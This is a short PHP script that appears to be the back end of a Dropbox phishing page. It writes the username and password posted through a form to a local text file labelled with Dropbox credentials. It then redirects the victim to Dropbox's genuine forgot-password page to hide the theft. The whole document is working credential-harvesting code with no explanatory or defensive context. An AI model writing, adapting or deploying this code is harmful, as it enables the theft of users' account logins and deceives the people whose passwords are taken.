<?php

file_put_contents("usernames.txt", "Dropbox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.dropbox.com/forgot/');
exit();
?>